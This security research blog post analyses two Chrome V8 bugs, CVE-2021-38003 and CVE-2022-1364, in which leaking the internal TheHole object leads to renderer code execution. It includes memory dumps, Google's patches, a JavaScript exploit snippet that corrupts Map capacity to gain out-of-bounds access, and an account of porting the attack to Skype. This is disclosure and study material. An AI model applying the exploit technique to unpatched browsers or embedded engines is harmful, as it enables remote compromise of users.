> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [medium.com](https://medium.com/numen-cyber-labs/from-leaking-thehole-to-chrome-renderer-rce-183dcb6f3078)

> An insight into the exploits of documented Chrome vulnerabilities.

CVE-2021-38003
--------------

CVE-2021–38003, or [Issue 1263462](https://bugs.chromium.org/p/chromium/issues/detail?id=1263462), was a vulnerability exposed in 2021. The root cause of this vulnerability was due to the fact that `JsonStringifier::SerializeObject()` did not set the pending_exception before this function returns. As a result, hackers can leak TheHole object to JavaScript (For more information, refer to Google’s official report). This violates the assumptions of Chrome’s source code and eventually results in memory corruption in Chrome Render process. The Poc shared in the Google report shows that by setting the `map.size` to -1, it can directly cause the process to crash. As the issue has already been analyzed by the public, we will not be discussing it any further.

Issue1263462 was fixed simply and brutally:

```
Object Isolate::pending_exception() {
-  DCHECK(has_pending_exception());
+  CHECK(has_pending_exception());
   DCHECK(!thread_local_top()->pending_exception_.IsException(this));
   return thread_local_top()->pending_exception_;
 }

```

The solution was to make a change from DCHECK to CHECK. But simple and brutal fixes like these often leaves interesting problems or even results in security problems again. The exploit of CVE-2022–1364 proves this.

CVE-2022–1364
-------------

CVE-2022–1364, or Issue 1315901, was submitted by P0 on April 13, 2022. Comparing the output before the function’s optimization, the poc from the report shows that it can lead to an incorrect output after the function’s optimization. The root cause of the vulnerability was due to the omission of non-standard API:getThis, during node escape analysis. This short of consideration eventually lead to the leak of TheHole object to javascript. And with the help of `Map.set` function, hackers can get render RCE in Chrome.

Before analyzing the vulnerability, we would need a brief understanding of v8 optimization and deoptimization, of which blogs of [Modern attacks on the Chrome browser: optimizations and deoptimizations](https://doar-e.github.io/blog/2020/11/17/modern-attacks-on-the-chrome-browser-optimizations-and-deoptimizations/) should give a decent understanding. We would also need to have a basic understanding of the Framestates in v8. Thus, a good read of [V8 Optimize: FrameState](https://bugs.chromium.org/p/chromium/issues/detail?id=788539) and a basic review of issue788539 is recommended.

TheHole is a special object in v8. Let’s have a look at its memory layout in d8.

```
d8> load('/home/avboy/Desktop/poc.js');
hole
DebugPrint: 0x1cd108002449: [Oddball] in ReadOnlySpace: #hole
0x1cd108002421: [Map] in ReadOnlySpace
 - type: ODDBALL_TYPE
 - instance size: 28
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - stable_map
 - non-extensible
 - back pointer: 0x1cd1080023d1 <undefined>
 - prototype_validity cell: 0
 - instance descriptors (own) #0: 0x1cd1080021dd <Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)>
 - prototype: 0x1cd108002251 <null>
 - constructor: 0x1cd108002251 <null>
 - dependent code: 0x1cd1080021d1 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0

```

Just like objects of True/False/null/undefined from JavaScript, TheHole’s type is ODDBALL_TYPE too but we can’t get TheHole from JavaScript directly without the help of Native syntax because Chrome does not allow TheHole to exist in JavaScript. It is easy to get that conclusion from Chromium source code.

```
template <typename... Vars>
  TNode<Object> MaybeSkipHole(
      TNode<Object> o, ElementsKind kind,
      GraphAssemblerLabel<sizeof...(Vars)>* continue_label,
      TNode<Vars>... vars) {
// .........省略
// .........省略
    // The contract is that we don't leak "the hole" into "user JavaScript",
    // so we must rename the {element} here to explicitly exclude "the hole"
    // from the type of {element}.
    Bind(&if_not_hole);
    return TypeGuardNonInternal(o);
  }

```

Another point worth mentioning is that, since TheHole object belongs to ODDBALL_TYPE, its memory layout is very close to the native beginning object of v8. In v8–10.0.1, we can get a basic knowledge of the memory layout of TheHole and its Map.

```
Self
1CD108002130        08002131 1B00000A 0C0000F8 004003FF
1CD108002140        08002251 08002251 080021DD 080021D1
1CD108002150        00000000 00000000 0badbeef 0badbeef
                    Map
1CD108002420        08002131 39000007 0C000083 004003FF
1CD108002430        08002251 08002251 080021DD 080021D1
                                       TheHole
1CD108002440        00000000 00000000 08002421 FFF7FFFF

```

Based on the basic knowledge of the above, it is easy to see that the address of the TheHole’s Map object is 0x1CD108002420. The Map (located at memory 0x1CD108002130) of this object (located at memory 0x1CD108002420) points to itself. The result of gdb parsing are as follows:

```
pwndbg> job 0x1CD108002131
0x1cd108002131: [Map] in ReadOnlySpace
 - type: MAP_TYPE
 - instance size: 40
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - stable_map
 - non-extensible
 - back pointer: 0x1cd1080023d1 <undefined>
 - prototype_validity cell: 0
 - instance descriptors (own) #0: 0x1cd1080021dd <Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)>
 - prototype: 0x1cd108002251 <null>
 - constructor: 0x1cd108002251 <null>
 - dependent code: 0x1cd1080021d1 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0

```

Since the object’s Map is itself, the recursive parsing of Map eventually ends here. Such a memory layout does provide a lot convenience when we are making fake objects, for example, issues like 1084820. If it is really hard to groom a stable memory layout, we can consider to forge/leak TheHole from faking the most primitive object and simulating the memory layout at the address of 0x1CD108002130.

Before writing the exploit, a basic understanding of the memory layout of Map object would be useful. A good read of the blog [[V8 Deep Dives] Understanding Map Internals](https://itnext.io/v8-deep-dives-understanding-map-internals-45eb94a183df) should suffice.

Although the root cause of CVE-2022–1364 is different from CVE-2021–38003, it also has nothing to do with synchronous pending_exception_tag adjustment. By combining Error object construction and optimization, Hackers can leak TheHole to JavaScript through incorrect escape analysis. This public poc is definitely worth studying.

After TheHole object is returned to JavaScript, we can change `map.size` to -1 easily. Using the exploitation techniques from issue report [1263462](https://bugs.chromium.org/p/chromium/issues/detail?id=1263462) is enough. But this time, it is different from issue 1150649 etc. as the size of -1 cannot give us the ability of arbitrary memory reading and writing. After trying to use `map1.set()` function, `map1.size` will increase to 0. Thus, I think the key point of this exploit is to destroy memory properly by function of `map1.set`, and then achieve the ability to read and write, and finally get RCE like we do as usual. The exploit of CVE-2022-1364 is almost identical to CVE-2021-38003.

Memory of Map Layout
--------------------

The test script is as follows:

```
m = new Map();
%DebugPrint(m);
readline();

```

By using m as the Map object, we can get the memory layout like this:

```
2DB60810AE54        082C2771 08002249 08002249 0810AE65
2DB60810AE64        08002C19 00000022 00000000 00000000
2DB60810AE74        00000004 FFFFFFFE FFFFFFFE 080023D1

```

We need to make it clear how to parse the address of 0x2DB60810AE74:

```
pwndbg> job 0x2DB60810AE65
0x2db60810ae65: [OrderedHashMap]
 - FixedArray length: 17
 - elements: 0
 - deleted: 0
 - buckets: 2
 - capacity: 4
 - buckets: {
              0: -1
              1: -1
 }
 - elements: {
 }

```

**It’s not difficult to conclude that:** the data located at memory of 0x2DB60810AE74 is the Map’s capacity. Just keep in mind that in hash tables, capacity can always be expressed as a power of 2. There are two buckets in an empty hash table with a maximum capacity of 2 * number_of_buckets.

Change the Map’s Capacity
-------------------------

After the theory above is carried out, lets come back to finish this exploit. As the `map.size` equals to -1, we can invoke the `map.set` function and try to overwrite something. Now take seriously to the memory's change with in the scope of map, we can get an overwrite operation to the capacity. This is the Key operation of this exploit. We should let the data, which was overwriten by `map.set` , meet the requirement of v8. After setting the capacity to a larger value, we get an out-of-bounds read and write. Because we met the capacity, we won't crash the Chrome render process. This important javascript statement of set function is `map1.set(0x10, -1)`.

It’d be better for us to carefully make as small out-of-bounds writes as possible. I think it’s an artifact of writing exploit. Eventually we achieve the out-of-bounds write, and the rest of the steps are consistent with the conventional ideas.

Exploit
-------

To be perfectly honest, even if there are no vulnerabilities like CVE-2021–38003 and CVE-2022–1364, we can also achieve chrome render RCE by the usage of native function: `%TheHole()`. Just make sure the commit hash is earlier than **66c8de2cdac10cad9e622ecededda411b44ac5b3** is ok. This exploit method is stable and independent to chrome’s/d8’s version. The final exploit of changing the length of array is here:

```
var map1 = null;
var foo_arr = null;
function getmap(m) {
    m = new Map();
    m.set(1, 1);
    m.set(%TheHole(), 1);
    m.delete(%TheHole());
    m.delete(%TheHole());
    m.delete(1);
    return m;
}
for (let i = 0; i < 0x3000; i++) {
    map1 = getmap(map1);
    foo_arr = new Array(1.1, 1.1);//1.1=3ff199999999999a
}
map1.set(0x10, -1);
gc();
map1.set(foo_arr, 0xffff);
%DebugPrint(foo_arr);

```

Similarly to issue1150649, when the details of issues were made public, the exploit method was also made public. The two exploits tweeted in 2021 which can pwn the latest version of Chrome proved this idea.

Google fixed this exploit method as soon as possible. Functions, like `Map.prototype.delete,` `Set.prototype.delete`, `WeakMap.prototype.deleten` and `WeakSet.prototype.delete` , were patched by Hard check of TheHole. If the argument of key is TheHole, there is going to be a render crash. What a Tough and Brutal Patch!

```
@@ -1762,6 +1762,9 @@
   ThrowIfNotInstanceType(context, receiver, JS_MAP_TYPE,
                          "Map.prototype.delete"); 
+  // This check breaks a known exploitation technique. See crbug.com/1263462
+  CSA_CHECK(this, TaggedNotEqual(key, TheHoleConstant()));
+
   const TNode<OrderedHashMap> table =
       LoadObjectField<OrderedHashMap>(CAST(receiver), JSMap::kTableOffset);

 @@ -1930,6 +1933,9 @@
   ThrowIfNotInstanceType(context, receiver, JS_SET_TYPE,
                          "Set.prototype.delete"); 
+  // This check breaks a known exploitation technique. See crbug.com/1263462
+  CSA_CHECK(this, TaggedNotEqual(key, TheHoleConstant()));
+
   const TNode<OrderedHashSet> table =
       LoadObjectField<OrderedHashSet>(CAST(receiver), JSMap::kTableOffset);

 @@ -2878,6 +2884,9 @@
   ThrowIfNotInstanceType(context, receiver, JS_WEAK_MAP_TYPE,
                          "WeakMap.prototype.delete"); 
+  // This check breaks a known exploitation technique. See crbug.com/1263462
+  CSA_CHECK(this, TaggedNotEqual(key, TheHoleConstant()));
+
   Return(CallBuiltin(Builtin::kWeakCollectionDelete, context, receiver, key));
 }

```

Considering the wide impact of Chrome Patch Gap. As soon as we finished the two exploits, we quickly translated them to the latest version of Skype. Skype brings up the built-in browser when we are clicking whitelisted URLs. Suppose there is an XSS from whitelisted URLs, there can also be an RCE in the latest Skype version. This can be seen in the video below:

To be honest, when we are talking about Chrome Patch Gap, we did keep pwning the latest version of IMs like Skype.

[https://chromium.googlesource.com/v8/v8/+/66c8de2cdac10cad9e622ecededda411b44ac5b3](https://chromium.googlesource.com/v8/v8/+/66c8de2cdac10cad9e622ecededda411b44ac5b3)

[https://twitter.com/frust93717815/status/1382301769577861123](https://twitter.com/frust93717815/status/1382301769577861123)

[https://chromium.googlesource.com/v8/v8/+/66c8de2cdac10cad9e622ecededda411b44ac5b3%5E%21/#F0](https://chromium.googlesource.com/v8/v8/+/66c8de2cdac10cad9e622ecededda411b44ac5b3%5E%21/#F0)

[https://itnext.io/v8-deep-dives-understanding-map-internals-45eb94a183df](https://itnext.io/v8-deep-dives-understanding-map-internals-45eb94a183df)

[https://source.chromium.org/chromium/chromium/src/+/main:v8/src/compiler/js-call-reducer.cc;drc=a6d43952bb3bc5a90e3d085f4e2a94320d80cc9c;l=754](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/compiler/js-call-reducer.cc;drc=a6d43952bb3bc5a90e3d085f4e2a94320d80cc9c;l=754)

[https://bugs.chromium.org/p/chromium/issues/detail?id=1263462](https://bugs.chromium.org/p/chromium/issues/detail?id=1263462)

[https://bugs.chromium.org/p/chromium/issues/detail?id=1315901](https://bugs.chromium.org/p/chromium/issues/detail?id=1315901)

![](https://miro.medium.com/max/1400/1*zIdS6YPVVgSe84EwKdIQmw.png)

Finally, if there are digital currency wallet manufacturers or exchanges that use a built-in browser engine, please upgrade in time to ensure their security. We will continue to study browser security and welcome relevant teams to contact us to jointly maintain the ecological security of the blockchain, and not just the security of the blockchain itself.

We, Numen Cyber, focus on the overall security of the blockchain security ecosystem, as well as operating systems/browser security/mobile security, and regularly disclose internal technologies, so stay tuned!